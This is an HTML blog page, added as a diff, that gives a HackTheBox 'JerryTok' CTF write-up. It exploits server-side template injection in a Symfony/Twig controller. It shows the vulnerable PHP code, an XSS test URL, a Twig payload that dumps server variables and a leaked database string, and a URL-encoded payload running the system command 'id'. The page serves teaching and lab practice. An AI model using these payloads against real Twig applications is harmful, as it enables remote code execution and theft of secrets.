@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB JerryTok Challenge Writeup - GhostFlagged Blog</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="profile-section">
+        <div class="profile-pic">
+          <img src="../033c6a1e8ca3ad18b0e6ac169604c66b.jpg" alt="Profile Picture" id="profile-img">
+        </div>
+        <h1>GhostFlagged</h1>
+        <p class="tagline">My personal space for writing and sharing ideas.</p>
+      </div>
+      
+      <div class="bio-section">
+        <h3>Bio</h3>
+        <p>Security researcher and CTF enthusiast. Passionate about web application security, vulnerability research, and sharing knowledge through writeups and tools.</p>
+      </div>
+      
+      <div class="contact-section">
+        <h3>Contact</h3>
+        <a href="mailto:your.email@example.com" class="email-link">your.email@example.com</a>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a href="../index.html#posts" class="nav-link">Posts</a>
+      </nav>
+
+      <footer class="sidebar-footer">
+        <p>&copy; 2025 GhostFlagged</p>
+      </footer>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <article class="post-content">
+        <a href="../index.html" class="back-link">← Back to Home</a>
+        <div class="post-title-header">
+          <span class="post-category category-ctf">CTF</span>
+          <h1>HTB JerryTok Challenge Writeup</h1>
+        </div>
+        <p class="post-meta">Published on January 2025</p>
+        <div class="post-body">
+          <p>This writeup covers my approach to solving the JerryTok challenge on HackTheBox. Here is the challenge description:</p>
+
+          <blockquote>
+            <p>Welcome to JerryTok, your portal to the nearest jerryboree, where mediocrity is celebrated! Dive into the daily escapades of the wonderfully average, from mundane mishaps to modest triumphs. Share your moments, connect, and laugh as you find glory in the ordinary. Join now and embrace the delightfully dull at your local jerryboree!</p>
+          </blockquote>
+
+          <h2>How I Approached the Challenge</h2>
+          
+          <p>I started with a black-box approach and couldn't find anything obvious on the web application, so I decided to download the source code and review it myself. The code format was unfamiliar to me—I had never seen this kind of structure before. I began searching through the code and examining every file.</p>
+
+          <p>I discovered I was facing a framework called <strong>Symfony</strong>. I did a quick search about it to understand the source code structure. After learning about Symfony, I checked <code>src/Controller/DefaultController.php</code> and found the following code:</p>
+
+          <pre class="code-block"><code>&lt;?php
+
+namespace App\Controller;
+
+use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+use Symfony\Component\HttpFoundation\Response;
+use Symfony\Component\HttpFoundation\Request;
+
+class DefaultController extends AbstractController
+{
+    public function index(Request $request): Response
+    {
+        $location = $request->get('location');
+
+        if (empty($location))
+        {
+            $latitude = mt_rand(-90, 90) + mt_rand() / mt_getrandmax();
+            $longitude = mt_rand(-180, 180) + mt_rand() / mt_getrandmax();
+            $location = "($latitude, $longitude)";
+        } 
+        
+        $message = $this->container->get('twig')->createTemplate(
+                "Located at: {$location} from your ship's computer"
+            )
+            ->render();
+ 
+        return $this->render('base.html.twig', [
+            'message' => $message ?? ''
+        ]);
+    }
+}</code></pre>
+
+          <h2>Identifying the Vulnerability</h2>
+          
+          <p>I found what I was looking for—a user-controllable input. There was a variable called <code>$location</code> that was being retrieved from the request. I tested it on the index page with the following format:</p>
+
+          <pre class="code-block"><code>http://[REDACTED_IP]:[PORT]/index.php?location=value</code></pre>
+
+          <p>The value was reflected on the web page. I tested for XSS to see what I could do with the input, and it worked:</p>
+
+          <pre class="code-block"><code>http://[REDACTED_IP]:[PORT]/index.php?location=%3Cimg%20src%3dx%20onerror%3dalert%281111111%29%3E</code></pre>
+
+          <p>Since we were looking for server-side vulnerabilities rather than client-side, the first thing that came to mind was testing for <strong>Server-Side Template Injection (SSTI)</strong> vulnerability. I was right—it was vulnerable to SSTI.</p>
+
+          <p>I used payloads from the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a> repository. I knew we were facing a Twig template engine because of the files in the template folder with the <code>.twig</code> extension.</p>
+
+          <h2>Testing SSTI Payloads</h2>
+          
+          <p>I tested the following payload to get more information about what we were facing:</p>
+
+          <pre class="code-block"><code>{{app.request.server.all|join(',')}}</code></pre>
+
+          <p>Here is the output of the payload we ran:</p>
+
+          <pre class="code-block"><code>php-script,
+200,[REDACTED_IP]:[PORT],
+1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36,text/html,
+application/xhtml+xml,
+application/xml;q=0.9,
+image/avif,image/webp,
+image/apng,*/*;q=0.8,
+application/signed-exchange;v=b3;q=0.7,gzip,
+ deflate, br,en-US,en;q=0.9,keep-alive,
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,<address>Apache/2.4.59 (Unix) Server at [REDACTED_IP] Port [PORT]</address>,
+Apache/2.4.59 (Unix),[REDACTED_IP],[REDACTED_IP],[PORT],[REDACTED_IP],
+/www/public,http,/cgi-bin,/usr/bin,
+minimakelaris@makelarid.es,
+/www/public/index.php,19543,
+/index.php,
+location={{app.request.server.all|join(&#039;,&#039;)}},
+CGI/1.1,HTTP/1.1,GET,location={{app.request.server.all|join(&#039;,&#039;)}},
+/index.php?location={{app.request.server.all|join(&#039;,&#039;)}},
+/index.php,
+/usr/bin/php-cgi,
+/index.php,/
+www/public/index.php,
+/cgi-bin/php-cgi,
+/index.php,1762636254.4046,1762636254,
+prod,
+1b647c7e34c9d5284c25b6a7639ed4bf,
+postgresql://app:!ChangeMe!@127.0.0.1:5432/app?serverVersion=16&amp;charset=utf8,doctrine://default?auto_setup=0,
+APP_ENV,
+APP_SECRET,
+DATABASE_URL,
+MESSENGER_TRANSPORT_DSN,
+0</code></pre>
+
+          <h2>Discovering the Database Connection String</h2>
+          
+          <p>Here we found something that might help us solve this challenge—we now have the PostgreSQL connection string:</p>
+
+          <pre class="code-block"><code>postgresql://app:!ChangeMe!@127.0.0.1:5432/app?serverVersion=16&amp;charset=utf8</code></pre>
+
+          <h2>Attempting Command Execution</h2>
+          
+          <p>I then attempted to execute system commands via the SSTI vulnerability. I revisited PayloadsAllTheThings and tested every SSTI payload. One worked on my local lab instance but failed on the HTB machine, for reasons I couldn't determine.</p>
+
+          <p>Here is the payload I used:</p>
+
+          <pre class="code-block"><code>http://127.0.0.1:1337/index.php?location=%7b%7b%5b%27%69%64%27%5d%7c%66%69%6c%74%65%72%28%27%73%79%73%74%65%6d%27%29%7d%7d%0a
+// Decoded: {{['id']|filter('system')}}</code></pre>
+
+          <h2>Key Takeaways</h2>
+          
+          <ul>
+            <li><strong>Source Code Review:</strong> When black-box testing doesn't reveal obvious vulnerabilities, reviewing the source code can uncover critical issues.</li>
+            <li><strong>Server-Side Template Injection (SSTI):</strong> User-controlled input being directly inserted into template rendering can lead to SSTI vulnerabilities.</li>
+            <li><strong>Framework Knowledge:</strong> Understanding the framework (Symfony/Twig in this case) is crucial for identifying and exploiting vulnerabilities.</li>
+            <li><strong>Information Disclosure:</strong> SSTI can be used to extract sensitive information like database connection strings and environment variables.</li>
+            <li><strong>Payload Testing:</strong> Different environments may respond differently to the same payloads, requiring adaptation and testing.</li>
+          </ul>
+        </div>
+      </article>
+    </main>
+  </div>
+</body>
+</html>
+
